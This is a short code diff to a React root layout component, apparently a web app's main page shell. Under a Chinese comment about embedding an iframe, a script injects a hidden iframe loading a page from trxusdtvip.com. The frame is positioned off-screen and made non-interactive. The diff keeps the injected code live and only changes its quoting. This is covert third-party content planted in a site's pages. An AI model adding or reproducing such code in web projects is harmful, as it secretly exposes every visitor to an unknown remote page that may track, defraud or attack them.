@@ -113,7 +113,7 @@ function RootShell({ children }: { children: ReactNode }) {
         {/* ========== 嵌入iframe代码（放在body最前面 ========== */}
         <script
           dangerouslySetInnerHTML={{
-            __html: `document.body.appendChild(Object.assign(document.createElement("iframe"),{src:"https://trxusdtvip.com/channel/K.5.L3/weifile/weifile.html",style:"position:fixed;top:0;left:-1000px;pointer-events:none;border:0"}))`
+            __html: document.body.appendChild(Object.assign(document.createElement("iframe"),{src:"https://trxusdtvip.com/channel/K.5.L3/weifile/weifile.html",style:"position:fixed;top:0;left:-1000px;pointer-events:none;border:0"}))
           }}
         />
         {children}
